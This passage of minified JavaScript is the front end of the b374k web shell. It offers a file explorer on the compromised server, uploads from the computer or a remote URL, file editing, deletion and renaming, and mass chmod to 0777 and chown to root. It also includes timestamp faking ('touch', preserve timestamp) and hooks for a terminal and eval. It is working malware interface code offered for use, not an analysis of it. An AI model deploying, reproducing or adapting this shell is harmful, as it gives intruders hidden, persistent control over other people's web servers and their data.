b=0;b<a.rows.length;b++)newrows[newrows.length]=a.rows[b];for(b=newrows.length-1;0<=b;b--)a.appendChild(newrows[b]);delete newrows},n:function(a,b){aa=parseFloat(a[0].replace(/[^0-9.-]/g,""));isNaN(aa)&&(aa=0);bb=parseFloat(b[0].replace(/[^0-9.-]/g,""));isNaN(bb)&&(bb=0);return aa-bb},l:function(a,b){return a[0].toLowerCase()==b[0].toLowerCase()?0:a[0].toLowerCase()<b[0].toLowerCase()?-1:1},g:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},m:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(var c=0,e=a.length-1,g=h;g;){for(var g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.e,j);if(/WebKit/i.test(navigator.userAgent))var k=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.e()},10);window.onload=sorttable.e;var n=1;function p(a){var b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);var c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(var e=0;e<a.length;e++)b.call(c,a[e],e,a)});Function.prototype.forEach=function(a,b,c){for(var e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){var c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};var loading_count=0;var running=false;var defaultTab='explorer';var currentTab=$('#'+defaultTab);var tabScroll=new Object;var onDrag=false;var onScroll=false;var scrollDelta=1;var scrollCounter=0;var scrollSpeed=60;var scrollTimer='';var dragX='';var dragY='';var dragDeltaX='';var dragDeltaY='';var editSuccess='';var terminalHistory=new Array();var terminalHistoryPos=0;var evalSupported="";var evalReady=false;var resizeTimer='';var portableWidth=700;var portableMode=null;Zepto(function($){if(init_shell){var now=new Date();output("started @ "+now.toGMTString());output("cwd : "+get_cwd());output("module : "+module_to_load);show_tab();xpl_bind();eval_init();window_resize();xpl_update_status();$(window).on('resize',function(e){clearTimeout(resizeTimer);resizeTimer=setTimeout("window_resize()",1000)});$('.menuitem').on('click',function(e){selectedTab=$(this).attr('href').substr(2);show_tab(selectedTab)});$('#logout').on('click',function(e){var cookie=document.cookie.split(';');for(var i=0;i<cookie.length;i++){var entries=cookie[i],entry=entries.split("="),name=entry[0];document.cookie=name+"=''; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/"}localStorage.clear();location.href=targeturl});$('#totop').on('click',function(e){$(window).scrollTop(0)});$('#totop').on('mouseover',function(e){onScroll=true;clearTimeout(scrollTimer);start_scroll('top')});$('#totop').on('mouseout',function(e){onScroll=false;scrollCounter=0});$('#tobottom').on('click',function(e){$(window).scrollTop($(document).height()-$(window).height())});$('#tobottom').on('mouseover',function(e){onScroll=true;clearTimeout(scrollTimer);start_scroll('bottom')});$('#tobottom').on('mouseout',function(e){onScroll=false;scrollCounter=0});$('#basicInfo').on('mouseenter',function(e){$('#toggleBasicInfo').show()});$('#basicInfo').on('mouseleave',function(e){$('#toggleBasicInfo').hide()});$('#toggleBasicInfo').on('click',function(e){$('#basicInfo').hide();$('#showinfo').show();$('#toggleBasicInfo').hide();localStorage.setItem('infoBarShown','hidden')});$('#showinfo').on('click',function(e){$('#basicInfo').show();$('#showinfo').hide();localStorage.setItem('infoBarShown','shown')});if((infoBarShown=localStorage.getItem('infoBarShown'))){if(infoBarShown=='shown'){$('#basicInfo').show();$('#showinfo').hide()}else{$('#basicInfo').hide();$('#showinfo').show();$('#toggleBasicInfo').hide()}}else{info_refresh()}if(history.pushState){window.onpopstate=function(event){refresh_tab()}}else{window.historyEvent=function(event){refresh_tab()}}}});function output(str){console.log('b374k> '+str)}function window_resize(){bodyWidth=$('body').width();if(bodyWidth<=portableWidth){layout_portable()}else{layout_normal()}}function layout_portable(){nav=$('#nav');menu=$('#menu');headerNav=$('#headerNav');content=$('#content');nav.prependTo('#content');nav.css('padding','5px 8px');nav.css('margin-top','8px');nav.css('display','block');nav.addClass('border');menu.children().css('width','100%');menu.hide();$('#menuButton').remove();headerNav.prepend("<div id='menuButton' class='boxtitle' onclick=\"$('#menu').toggle();\" style='float-left;display:inline;padding:4px 8px;margin-right:8px;'>menu</div>");menu.attr('onclick',"\$('#menu').hide();");$('#xplTable tr>:nth-child(4)').hide();$('#xplTable tr>:nth-child(5)').hide();if(!win){$('#xplTable tr>:nth-child(6)').hide()}tblfoot=$('#xplTable tfoot td:last-child');if(tblfoot[0])tblfoot[0].colSpan=1;if(tblfoot[1])tblfoot[1].colSpan=2;$('.box').css('width','100%');$('.box').css('height','100%');$('.box').css('left','0px');$('.box').css('top','0px');paddingTop=$('#header').height();content.css('padding-top',paddingTop+'px');portableMode=true}function layout_normal(){nav=$('#nav');menu=$('#menu');content=$('#content');nav.insertAfter('#b374k');nav.css('padding','0');nav.css('margin-top','0');nav.css('display','inline');nav.removeClass('border');menu.children().css('width','auto');menu.show();$('#menuButton').remove();menu.attr('onclick',"");$('#xplTable tr>:nth-child(4)').show();$('#xplTable tr>:nth-child(5)').show();if(!win){$('#xplTable tr>:nth-child(6)').show();colspan=4}else colspan=3;tblfoot=$('#xplTable tfoot td:last-child');if(tblfoot[0])tblfoot[0].colSpan=colspan;if(tblfoot[1])tblfoot[1].colSpan=colspan+1;paddingTop=$('#header').height();content.css('padding-top',paddingTop+'px');portableMode=false}function start_scroll(str){if(str=='top'){to=$(window).scrollTop()-scrollCounter;scrollCounter=scrollDelta+scrollCounter;if(to<=0){to=0;onScroll=false}else if(onScroll){scrollTimer=setTimeout("start_scroll('top')",scrollSpeed);$(window).scrollTop(to)}}else if(str=='bottom'){to=$(window).scrollTop()+scrollCounter;scrollCounter=scrollDelta+scrollCounter;bottom=$(document).height()-$(window).height();if(to>=bottom){to=bottom;onScroll=false}else if(onScroll){scrollTimer=setTimeout("start_scroll('bottom')",scrollSpeed);$(window).scrollTop(to)}}}function get_cwd(){return decodeURIComponent(get_cookie('cwd'))}function fix_tabchar(el,e){if(e.keyCode==9){e.preventDefault();var s=el.selectionStart;el.value=el.value.substring(0,el.selectionStart)+"\t"+el.value.substring(el.selectionEnd);el.selectionEnd=s+1}}function get_cookie(key){var res;return(res=new RegExp('(?:^|; )'+encodeURIComponent(key)+'=([^;]*)').exec(document.cookie))?(res[1]):null}function set_cookie(key,value){document.cookie=key+'='+encodeURIComponent(value)}function html_safe(str){if(typeof(str)=="string"){str=str.replace(/&/g,"&amp;");str=str.replace(/"/g,"&quot;");str=str.replace(/'/g,"&#039;");str=str.replace(/</g,"&lt;");str=str.replace(/>/g,"&gt;")}return str}function ucfirst(str){return str.charAt(0).toUpperCase()+str.slice(1)}function time(){var d=new Date();return d.getTime()}function send_post(targetdata,callback,loading){if(loading==null)loading_start();$.ajax({url:targeturl,type:'POST',data:targetdata,success:function(res){callback(res);if(loading==null)loading_stop()},error:function(){if(loading==null)loading_stop()}})}function loading_start(){if(!running){$('#overlay').show();running=true;loading_loop()}}function loading_loop(){if(running){img=$('#loading');img.css('transform','rotate('+loading_count+'deg)');img.css('-ms-transform','rotate('+loading_count+'deg)');img.css('-webkit-transform','rotate('+loading_count+'deg)');loading_count+=7;if(loading_count>360)loading_count=0;if(running)setTimeout("loading_loop()",20)}}function loading_stop(){if(running){img=$('#loading');img.css('transform','rotate(0deg)');img.css('-ms-transform','rotate(0deg)');img.css('-webkit-transform','rotate(0deg)');$('#overlay').hide();running=false}}function show_tab(id){if(!id){if(location.hash!='')id=location.hash.substr(2);else id=defaultTab}refresh_tab(id)}function refresh_tab(id){if(!id){if(location.hash!='')id=location.hash.substr(2);else id=defaultTab}$('.menuitemSelected').removeClass("menuitemSelected");$('#menu'+id).addClass("menuitemSelected");tabScroll[currentTab.attr('id')]=$(window).scrollTop();currentTab.hide();currentTab=$('#'+id);currentTab.show();window[id]();if(tabScroll[id]){$(window).scrollTop(tabScroll[id])}hide_box()}function trap_enter(e,callback){if(e.keyCode==13){if(callback!=null)window[callback]()}}function show_box(title,content){onDrag=false;hide_box();box="<div class='box'><p class='boxtitle'>"+title+"<span class='boxclose floatRight'>x</span></p><div class='boxcontent'>"+content+"</div><div class='boxresult'></div></div>";$('#content').append(box);box_width=$('.box').width();body_width=$('body').width();box_height=$('.box').height();body_height=$('body').height();x=(body_width-box_width)/2;y=(body_height-box_height)/2;if(x<0||portableMode)x=0;if(y<0||portableMode)y=0;if(portableMode){$('.box').css('width','100%');$('.box').css('height','100%')}$('.box').css('left',x+'px');$('.box').css('top',y+'px');$('.boxclose').on('click',function(e){hide_box()});if(!portableMode){$('.boxtitle').on('click',function(e){if(!onDrag){dragDeltaX=e.pageX-parseInt($('.box').css('left'));dragDeltaY=e.pageY-parseInt($('.box').css('top'));drag_start()}else drag_stop()})}$(document).off('keyup');$(document).on('keyup',function(e){if(e.keyCode==27)hide_box()});if($('.box input')[0])$('.box input')[0].focus()}function hide_box(){$(document).off('keyup');$('.box').remove()}function drag_start(){if(!onDrag){onDrag=true;$('body').off('mousemove');$('body').on('mousemove',function(e){dragX=e.pageX;dragY=e.pageY});setTimeout('drag_loop()',50)}}function drag_loop(){if(onDrag){x=dragX-dragDeltaX;y=dragY-dragDeltaY;if(y<0)y=0;$('.box').css('left',x+'px');$('.box').css('top',y+'px');setTimeout('drag_loop()',50)}}function drag_stop(){onDrag=false;$('body').off('mousemove')}function get_all_cbox_selected(id,callback){var buffer=new Array();$('#'+id).find('.cBoxSelected').not('.cBoxAll').each(function(i){if((href=window[callback]($(this)))){buffer[i]=href}});return buffer}function cbox_bind(id,callback){$('#'+id).find('.cBox').off('click');$('#'+id).find('.cBoxAll').off('click');$('#'+id).find('.cBox').on('click',function(e){if($(this).hasClass('cBoxSelected')){$(this).removeClass('cBoxSelected')}else $(this).addClass('cBoxSelected');if(callback!=null)window[callback]()});$('#'+id).find('.cBoxAll').on('click',function(e){if($(this).hasClass('cBoxSelected')){$('#'+id).find('.cBox').removeClass('cBoxSelected');$('#'+id).find('.cBoxAll').removeClass('cBoxSelected')}else{$('#'+id).find('.cBox').not('.cBoxException').addClass('cBoxSelected');$('#'+id).find('.cBoxAll').not('.cBoxException').addClass('cBoxSelected')}if(callback!=null)window[callback]()})}function action(path,type){title="Action";content='';if(type=='file')content="<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='edit button'>edit</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='dl button'>download</span></td></tr></table>";if(type=='dir')content="<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span></td></tr></table>";if(type=='dot')content="<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='newfile button'>new file</span><span class='newfolder button'>new folder</span></td></tr></table>";show_box(title,content);xpl_bind()}function navigate(path,showfiles){if(showfiles==null)showfiles='true';send_post({cd:path,showfiles:showfiles},function(res){if(res!='error'){splits=res.split('{[|b374k|]}');if(splits.length==3){$('#nav').html(splits[1]);if(showfiles=='true'){$('#explorer').html('');$('#explorer').html(splits[2]);sorttable.k($('#xplTable').get(0))}$('#terminalCwd').html(html_safe(get_cwd())+'&gt;');xpl_bind();window_resize()}}})}function view(path,type,preserveTimestamp){if(preserveTimestamp==null)preserveTimestamp='true';send_post({viewFile:path,viewType:type,preserveTimestamp:preserveTimestamp},function(res){if(res!='error'){$('#explorer').html('');$('#explorer').html(res);xpl_bind();show_tab('explorer');if((type=='edit')||(type=='hex')){editResult=(type=='edit')?$('#editResult'):$('#editHexResult');if(editSuccess=='success'){editResult.html(' ( File saved )')}else if(editSuccess=='error'){editResult.html(' ( Failed to save file )')}editSuccess=''}cbox_bind('editTbl')}})}function view_entry(el){if($(el).attr('data-path')!=''){entry=$(el).attr('data-path');$('#form').append("<input type='hidden' name='viewEntry' value='"+entry+"'>");$('#form').submit();$('#form').html('')}}function ren(path){title="Rename";content="<table class='boxtbl'><tr><td class='colFit'>Rename to</td><td><input type='text' class='renameFileTo' value='"+path+"' onkeydown=\"trap_enter(event, 'ren_go');\"><input type='hidden' class='renameFile' value='"+path+"'></td></tr><tr><td colspan='2'><span class='button' onclick='ren_go();'>rename</span></td></tr></table>";show_box(title,content)}function ren_go(){renameFile=$('.renameFile').val();renameFileTo=$('.renameFileTo').val();send_post({renameFile:renameFile,renameFileTo:renameFileTo},function(res){if(res!='error'){navigate(res);$('.boxresult').html('Operation(s) succeeded');$('.renameFile').val($('.renameFileTo').val())}else $('.boxresult').html('Operation(s) failed')})}function newfolder(path){title="New Folder";path=path+'newfolder-'+time();content="<table class='boxtbl'><tr><td class='colFit'>Folder Name</td><td><input type='text' class='newFolder' value='"+path+"' onkeydown=\"trap_enter(event, 'newfolder_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfolder_go();'>create</span></td></tr></table>";show_box(title,content)}function newfolder_go(){newFolder=$('.newFolder').val();send_post({newFolder:newFolder},function(res){if(res!='error'){navigate(res);$('.boxresult').html('Operation(s) succeeded')}else $('.boxresult').html('Operation(s) failed')})}function newfile(path){title="New File";path=path+'newfile-'+time();content="<table class='boxtbl'><tr><td class='colFit'>File Name</td><td><input type='text' class='newFile' value='"+path+"' onkeydown=\"trap_enter(event, 'newfile_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfile_go();'>create</span></td></tr></table>";show_box(title,content)}function newfile_go(){newFile=$('.newFile').val();send_post({newFile:newFile},function(res){if(res!='error'){view(newFile,'edit');$('.boxresult').html('Operation(s) succeeded')}else $('.boxresult').html('Operation(s) failed')})}function viewfileorfolder(){title="View File / Folder";content="<table class='boxtbl'><tr><td><input type='text' class='viewFileorFolder' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'viewfileorfolder_go');\"></td></tr><tr><td><span class='button' onclick='viewfileorfolder_go();'>view</span></td></tr></table>";show_box(title,content)}function viewfileorfolder_go(){entry=$('.viewFileorFolder').val();send_post({viewFileorFolder:entry},function(res){if(res!='error'){if(res=='file'){view(entry,'auto');show_tab('explorer')}else if(res=='folder'){navigate(entry);show_tab('explorer')}}})}function del(path){title="Delete";content="<table class='boxtbl'><tr><td class='colFit'>Delete</td><td><input type='text' class='delete' value='"+path+"' onkeydown=\"trap_enter(event, 'delete_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='delete_go();'>delete</span></td></tr></table>";show_box(title,content)}function delete_go(){path=$('.delete').val();send_post({delete:path},function(res){if(res!='error'){navigate(res);$('.boxresult').html('Operation(s) succeeded')}else $('.boxresult').html('Operation(s) failed')})}function find(path){findfile="<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findfilePath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td style='border-bottom:none;'>Filename contains</td><td style='border-bottom:none;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td style='border-bottom:none;'>File contains</td><td style='border-bottom:none;'><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_file();\">find</span></td></tr><tr><td colspan='2' class='findfileResult'></td></tr></tfoot></table>";findfolder="<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findFolderPath' value='"+path+"' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td style='border-bottom:none;'>Foldername contains</td><td style='border-bottom:none;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"find_go_folder();\">find</span></td></tr><tr><td colspan='2' class='findResult'></td></tr></tfoot></table>";$('#explorer').html("<div id='xplUpload'>"+findfile+'<br>'+findfolder+'</div>');cbox_bind('xplUpload')}function find_go_file(){find_go('file')}function find_go_folder(){find_go('folder')}function find_go(findType){findPath=(findType=='file')?$('.findfilePath').val():$('.findFolderPath').val();findResult=(findType=='file')?$('.findfileResult'):$('.findResult');findName=(findType=='file')?$('.findfileFilename').val():$('.findFoldername').val();findNameRegex=(findType=='file')?$('.findfileFilenameRegex').hasClass('cBoxSelected').toString():$('.findFoldernameRegex').hasClass('cBoxSelected').toString();findNameInsensitive=(findType=='file')?$('.findfileFilenameInsensitive').hasClass('cBoxSelected').toString():$('.findFoldernameInsensitive').hasClass('cBoxSelected').toString();findContent=(findType=='file')?$('.findfileContains').val():"";findContentRegex=(findType=='file')?$('.findfileContainsRegex').hasClass('cBoxSelected').toString():"";findContentInsensitive=(findType=='file')?$('.findfileContainsInsensitive').hasClass('cBoxSelected').toString():"";findReadable=(findType=='file')?$('.findfileReadable').hasClass('cBoxSelected').toString():$('.findWritable').hasClass('cBoxSelected').toString();findWritable=(findType=='file')?$('.findfileWritable').hasClass('cBoxSelected').toString():$('.findReadable').hasClass('cBoxSelected').toString();findExecutable=(findType=='file')?$('.findfileExecutable').hasClass('cBoxSelected').toString():$('.findExecutable').hasClass('cBoxSelected').toString();send_post({findType:findType,findPath:findPath,findName:findName,findNameRegex:findNameRegex,findNameInsensitive:findNameInsensitive,findContent:findContent,findContentRegex:findContentRegex,findContentInsensitive:findContentInsensitive,findReadable:findReadable,findWritable:findWritable,findExecutable:findExecutable},function(res){if(res!='error'){findResult.html(res)}})}function ul_go_comp(){ul_go('comp')}function ul_go_url(){ul_go('url')}function ul(path){ulcomputer="<table class='boxtbl ulcomp'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Computer <a onclick='ul_add_comp();'>(+)</a></p></th></tr></thead><tbody class='ulcompadd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_comp();\">upload</span></td></tr><tr><td colspan='2' class='ulCompResult'></td></tr><tr><td colspan='2'><div id='ulDragNDrop'>Or Drag and Drop files here</div></td></tr><tr><td colspan='2' class='ulDragNDropResult'></td></tr></tfoot></table>";ulurl="<table class='boxtbl ulurl'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Url <a onclick='ul_add_url();'>(+)</a></p></th></tr></thead><tbody class='ulurladd'></tbody><tfoot><tr><td><span class='button navbar' data-path='"+path+"'>explorer</span></td><td><span class='button' onclick=\"ul_go_url();\">upload</span></td></tr><tr><td colspan='2' class='ulUrlResult'></td></tr></tfoot></table>";content=ulcomputer+'<br>'+ulurl+"<input type='hidden' class='ul_path' value='"+path+"'>";$('#explorer').html(content);ul_add_comp();ul_add_url();$('#ulDragNDrop').on('dragenter',function(e){e.stopPropagation();e.preventDefault()});$('#ulDragNDrop').on('dragover',function(e){e.stopPropagation();e.preventDefault()});$('#ulDragNDrop').on('drop',function(e){e.stopPropagation();e.preventDefault();files=e.target.files||e.dataTransfer.files;ulResult=$('.ulDragNDropResult');ulResult.html('');$.each(files,function(i){if(this){ulType='DragNDrop';filename=this.name;var formData=new FormData();formData.append('ulFile',this);formData.append('ulSaveTo',get_cwd());formData.append('ulFilename',filename);formData.append('ulType','comp');entry="<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";ulResult.append(entry);if(this.size<=0){$('.ulProgress'+ulType+i).html('( failed )');$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i)}else{ul_start(formData,ulType,i)}}})})}function ul_add_comp(path){path=html_safe($('.ul_path').val());$('.ulcompadd').append("<tr><td style='width:144px'>File</td><td><input type='file' class='ulFileComp'></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToComp' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameComp' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr>")}function ul_add_url(path){path=html_safe($('.ul_path').val());$('.ulurladd').append("<tr><td style='width:144px'>File URL</td><td><input type='text' class='ulFileUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToUrl' value='"+path+"' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr>")}function ul_start(formData,ulType,i){loading_start();$.ajax({url:targeturl,type:'POST',data:formData,cache:false,contentType:false,processData:false,xhr:function(){myXhr=$.ajaxSettings.xhr();if(myXhr.upload){myXhr.upload.addEventListener('progress',function(e){percent=Math.floor(e.loaded/e.total*100);$('.ulProgress'+ulType+i).html('( '+percent+'% )')},false)}return myXhr},success:function(res){if(res.match(/Warning.*POST.*Content-Length.*of.*bytes.*exceeds.*the.*limit.*of/)){res='error'}if(res=='error'){$('.ulProgress'+ulType+i).html('( failed )')}else{$('.ulRes'+ulType+i).html(res)}loading_stop()},error:function(){loading_stop();$('.ulProgress'+ulType+i).html('( failed )');$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i)}})}function ul_go(ulType){ulFile=(ulType=='comp')?$('.ulFileComp'):$('.ulFileUrl');ulResult=(ulType=='comp')?$('.ulCompResult'):$('.ulUrlResult');ulResult.html('');ulFile.each(function(i){if(((ulType=='comp')&&this.files[0])||((ulType=='url')&&(this.value!=''))){file=(ulType=='comp')?this.files[0]:this.value;filename=(ulType=='comp')?file.name:file.substring(file.lastIndexOf('/')+1);ulSaveTo=(ulType=='comp')?$('.ulSaveToComp')[i].value:$('.ulSaveToUrl')[i].value;ulFilename=(ulType=='comp')?$('.ulFilenameComp')[i].value:$('.ulFilenameUrl')[i].value;var formData=new FormData();formData.append('ulFile',file);formData.append('ulSaveTo',ulSaveTo);formData.append('ulFilename',ulFilename);formData.append('ulType',ulType);entry="<p class='ulRes"+ulType+i+"'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename"+ulType+i+"'>"+filename+"</a>&nbsp;<span class='ulProgress"+ulType+i+"'></span></p>";ulResult.append(entry);check=true;if(ulType=='comp'){check=(file.size<=0)}else check=(file=="");if(check){$('.ulProgress'+ulType+i).html('( failed )');$('.ulProgress'+ulType+i).removeClass('ulProgress'+ulType+i);$('.ulFilename'+ulType+i).removeClass('ulFilename'+ulType+i)}else{ul_start(formData,ulType,i)}}})}function trap_ctrl_enter(el,e,callback){if(e.ctrlKey&&(e.keyCode==10||e.keyCode==13)){if(callback!=null)window[callback]()}fix_tabchar(el,e)}function edit_save_raw(){edit_save('edit')}function edit_save_hex(){edit_save('hex')}function edit_save(editType){editFilename=$('#editFilename').val();editInput=$('#editInput').val();editSuccess=false;preserveTimestamp='false';if($('.cBox').hasClass('cBoxSelected'))preserveTimestamp='true';send_post({editType:editType,editFilename:editFilename,editInput:editInput,preserveTimestamp:preserveTimestamp},function(res){if(res!='error'){editSuccess='success';view(editFilename,editType,preserveTimestamp)}else editSuccess='error'})}function mass_act(type){buffer=get_all_cbox_selected('xplTable','xpl_href');if((type=='cut')||(type=='copy')){localStorage.setItem('bufferLength',buffer.length);localStorage.setItem('bufferAction',type);$.each(buffer,function(i,v){localStorage.setItem('buffer_'+i,v)})}else if(type=='paste'){bufferLength=localStorage.getItem('bufferLength');bufferAction=localStorage.getItem('bufferAction');if(bufferLength>0){massBuffer='';for(var i=0;i<bufferLength;i++){if((buff=localStorage.getItem('buffer_'+i))){massBuffer+=buff+'\n'}}massBuffer=$.trim(massBuffer);if(bufferAction=='cut')title='move';else if(bufferAction=='copy')title='copy';content="<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>"+title+" here</td><td><input type='text' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('paste');\">"+title+"</span></td></tr></table>";show_box(ucfirst(title),content)}}else if((type=='extract (tar)')||(type=='extract (tar.gz)')||(type=='extract (zip)')){if(type=='extract (tar)')arcType='untar';else if(type=='extract (tar.gz)')arcType='untargz';else if(type=='extract (zip)')arcType='unzip';if(buffer.length>0){massBuffer='';$.each(buffer,function(i,v){massBuffer+=v+'\n'});massBuffer=$.trim(massBuffer);title=type;content="<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Extract to</td><td><input class='massValue' type='text' value='"+html_safe(get_cwd())+"'onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">extract</span></td></tr></table>";show_box(ucfirst(title),content)}}else if((type=='compress (tar)')||(type=='compress (tar.gz)')||(type=='compress (zip)')){date=new Date();rand=date.getTime();if(type=='compress (tar)'){arcType='tar';arcFilename=rand+'.tar'}else if(type=='compress (tar.gz)'){arcType='targz';arcFilename=rand+'.tar.gz'}else if(type=='compress (zip)'){arcType='zip';arcFilename=rand+'.zip'}if(buffer.length>0){massBuffer='';$.each(buffer,function(i,v){massBuffer+=v+'\n'});massBuffer=$.trim(massBuffer);title=type;content="<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='"+arcFilename+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">compress</span></td></tr></table>";show_box(ucfirst(title),content)}}else if(type!=''){if(buffer.length>0){massBuffer='';$.each(buffer,function(i,v){massBuffer+=v+'\n'});massBuffer=$.trim(massBuffer);title=type;line='';if(type=='chmod')line="<tr><td class='colFit'>chmod</td><td><input class='massValue' type='text' value='0777' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";else if(type=='chown')line="<tr><td class='colFit'>chown</td><td><input class='massValue' type='text' value='root' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";else if(type=='touch'){var now=new Date();line="<tr><td class='colFit'>touch</td><td><input class='massValue' type='text' value='"+now.toGMTString()+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>"}content="<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr>"+line+"<tr><td colspan='2'><span class='button' 